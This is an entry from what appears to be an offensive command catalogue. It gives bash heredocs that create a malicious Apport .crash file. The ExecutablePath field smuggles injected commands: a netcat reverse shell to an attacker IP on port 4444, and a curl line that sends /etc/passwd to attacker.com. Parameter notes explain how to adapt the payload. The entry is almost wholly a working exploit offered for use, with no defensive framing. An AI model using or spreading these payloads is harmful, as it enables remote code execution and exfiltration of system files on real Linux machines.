---
id: d4e5f6g7-h8i9-0123-defg-456789012345
data: |-
  cat > malicious.crash << EOF
  ProblemType: Crash
  Architecture: i386
  CrashCounter: 1
  Date: $(date)
  ExecutablePath: /bin/ls; nc -e /bin/sh 192.168.1.100 4444 #
  ProcCmdline: ls
  ProcEnviron:
  ProcStatus:
  Signal: 11
  StacktraceTop:

  EOF
tags:
  - rce
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:23:24.418Z'
verified: false
validated: true
submitted: true
---
# create-malicious-crash-file

## Command

```bash
cat > malicious.crash << EOF
ProblemType: Crash
Architecture: i386
CrashCounter: 1
Date: $(date)
ExecutablePath: /bin/ls; nc -e /bin/sh 192.168.1.100 4444 #
ProcCmdline: ls
ProcEnviron:
ProcStatus:
Signal: 11
StacktraceTop:

EOF
```

## Description

This command generates a malicious .crash file for Apport exploitation by embedding a command injection payload in the ExecutablePath field, allowing breakout to execute arbitrary commands like a reverse shell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `malicious.crash` | Output filename | Yes |
| `ExecutablePath` | Field for injection (modify payload as needed) | Yes |
| `192.168.1.100 4444` | Attacker IP and port for reverse shell | Yes |

## Examples

### Basic Usage

```bash
cat > test.crash << EOF
ProblemType: Crash
ExecutablePath: /bin/echo injected #
EOF
```

### Advanced Usage

```bash
cat > advanced.crash << EOF
ProblemType: Crash
ExecutablePath: /bin/ls; curl -d @/etc/passwd http://attacker.com/exfil #
EOF
```

## Expected Output

File created successfully; verify with `ls -l malicious.crash` showing ~200 bytes, and `cat malicious.crash` displaying the payload.

## Related

- [[Related Procedure: Craft-Malicious-Apport-Crash-File-for-RCE]]
